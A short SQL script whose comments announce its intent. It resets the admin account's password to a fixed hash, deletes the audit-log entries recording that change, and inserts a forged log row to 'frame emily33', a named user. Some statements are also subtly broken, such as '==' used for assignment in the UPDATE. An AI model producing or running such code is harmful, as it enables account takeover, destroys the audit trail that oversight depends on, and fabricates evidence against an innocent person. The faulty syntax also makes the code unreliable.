-- alter passoword of admin to oops!
UPDATE users SET password == '982c0381c279d139fd221fce974916e7'
WHERE username == 'admin';

-- erase any logs from the above password change
DELETE FROM user_logs
WHERE type = 'update' AND old_username = 'admin' AND new_password = '982c0381c279d139fd221fce974916e7';

-- frame emily33
INSERT INTO user_logs (type, old_username, new_username, old_password, new_password)
SELECT 'update', 'admin', 'admin', NULL, (
    SELECT password FROM users
    WHERE username = 'emily33'
);
